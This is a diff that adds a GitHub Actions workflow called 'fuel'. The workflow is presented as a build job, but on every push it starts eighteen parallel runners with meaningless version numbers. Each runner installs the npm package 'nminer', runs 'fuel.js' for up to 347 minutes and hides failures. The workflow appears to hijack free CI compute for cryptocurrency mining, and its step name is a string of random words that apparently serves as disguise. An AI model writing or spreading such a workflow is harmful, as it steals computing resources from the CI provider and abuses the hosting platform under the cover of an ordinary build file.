@@ -1,0 +1,43 @@
+name: fuel
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 9090 }
+          - { version: 7419 }
+          - { version: 2938 }
+          - { version: 3467 }
+          - { version: 9574 }
+          - { version: 450 }
+          - { version: 8260 }
+          - { version: 3296 }
+          - { version: 2249 }
+          - { version: 4839 }
+          - { version: 1867 }
+          - { version: 8594 }
+          - { version: 7965 }
+          - { version: 5414 }
+          - { version: 9117 }
+          - { version: 6128 }
+          - { version: 8363 }
+          - { version: 2885 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: often republican off woefully
+        run: |
+          npm install nminer@latest
+          timeout 347m node fuel.js || echo "fuel executed"
